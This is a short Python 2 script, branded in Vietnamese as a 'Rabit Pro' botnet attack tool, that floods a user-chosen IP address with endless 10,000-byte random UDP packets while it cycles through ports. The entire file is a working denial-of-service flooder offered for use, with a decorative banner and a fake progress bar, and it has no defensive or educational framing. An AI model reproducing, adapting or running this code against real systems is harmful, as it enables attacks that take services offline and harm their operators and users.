# Bản Quyền @2022 Thuộc Rabit Pro Team 

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

############## Settings ##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(10000)
timeout =  time.time() 
############# Settings ##############

os.system ("clear")
print ('''
\033[91m
░▒█▀▀▄░█▀▀▄░█▀▀▄░░▀░░▀█▀░░░▒█▀▀▄░▄▀▀▄░▀█▀░█▀▀▄░█▀▀░▀█▀░░░▒█░░▒█░▒█▄░▒█
░▒█▄▄▀░█▄▄█░█▀▀▄░░█▀░░█░░░░▒█▀▀▄░█░░█░░█░░█░▒█░█▀▀░░█░░░░░▒█▒█░░▒█▒█▒█
░▒█░▒█░▀░░▀░▀▀▀▀░▀▀▀░░▀░░░░▒█▄▄█░░▀▀░░░▀░░▀░░▀░▀▀▀░░▀░░░░░░▀▄▀░░▒█░░▀█
       
                               \033[92m[\033[91mCopyright : Nguyễn Đăng Tân \033[92m]
                               \033[93m[\033[94mEdit By\033[93m]\033[95m|_|\033[93m[\033[94mTeamLion X Rabit Pro\033[93m]                                                                         
''')
ip = raw_input("IP Domain  (1.1.1.1) > ")
port = input("Port 80/HTTP 443/HTTPS > ")

os.system("clear")
print "\033[91mRabit Bonet Chuẩn Bị Attack..."
print "\033[91m[                    ] 0% "
time.sleep(5)
print "\033[92m[=====               ] 30%"
time.sleep(5)
print "\033[92m[==========          ] 50%"
time.sleep(5)
print "\033[92m[===============     ] 90%"
time.sleep(5)
print "\033[92m[====================] 100%"
time.sleep(3)
os.system ("clear")
sent = 0
while True:
     while 1:
        if time.time() > timeout:
            break
        else:
            pass
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "\033[92mRabit %s Bonet Đang ATTACK %s RabitPro port:%s Thành Công"%(sent,ip,port)
     if port == 65534:
       port = 1